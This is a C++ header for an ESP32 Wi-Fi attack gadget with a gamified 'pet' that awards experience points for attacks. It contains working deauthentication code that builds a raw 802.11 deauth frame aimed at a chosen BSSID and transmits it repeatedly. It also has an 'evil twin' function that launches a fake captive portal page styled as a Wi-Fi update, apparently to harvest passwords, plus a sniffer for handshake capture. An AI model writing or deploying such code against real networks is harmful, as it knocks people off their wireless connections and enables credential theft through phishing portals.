#ifndef PWN_ATTACK_H
#define PWN_ATTACK_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include "PwnPet.h"
#include "PwnPower.h"
#include "Gamification.h"
#include "WiFiTools.h"
#include "EvilPortal.h"

struct AttackStats {
    int aps_scanned;
    int clients_seen;
    int handshakes_captured;
    bool is_walking;
};

class PwnAttack {
private:
    static AttackStats stats;
    static bool running;

public:
    static void init() {
        stats.aps_scanned = 0;
        stats.clients_seen = 0;
        stats.handshakes_captured = 0;
        stats.is_walking = false;
        running = false;
    }

    static void start() {
        if (running) return;
        running = true;
        WiFiTools::startSniffer();
        Serial.println("[Attack] started");
    }

    static void stop() {
        if (!running) return;
        running = false;
        WiFiTools::stopSniffer();
        Serial.println("[Attack] stopped");
    }

    static bool isRunning() { return running; }

    static void tick() {
        if (!running) return;
        if (PwnPower::isCritical()) {
            stop();
            return;
        }

        // Simple hook point for future scan/deauth logic; currently sniffer updates WiFiTools::nearby_devices
    }

    static void deauthTarget(const String &bssid) {
        uint8_t mac[6];
        int values[6];
        if (sscanf(bssid.c_str(), "%x:%x:%x:%x:%x:%x",
                   &values[0], &values[1], &values[2],
                   &values[3], &values[4], &values[5]) != 6) {
            return;
        }
        for (int i = 0; i < 6; ++i) mac[i] = (uint8_t)values[i];

        uint8_t packet[26] = {
            0xC0, 0x00, 0x3A, 0x01,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0,0,0,0,0,0,
            0,0,0,0,0,0,
            0x00, 0x00,
            0x07, 0x00
        };

        memcpy(&packet[10], mac, 6);
        memcpy(&packet[16], mac, 6);

        for (int i = 0; i < 3; ++i) {
            esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
            delay(10);
        }

        // Simple gamification hook
        if (random(0, 100) < 10) {
            PwnPet::addHandshake(false);
            Gamification::addXP(50);
        }
    }

    static void evilTwin(const String &ssid) {
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
    }
};

inline AttackStats PwnAttack::stats;
inline bool PwnAttack::running = false;

#endif
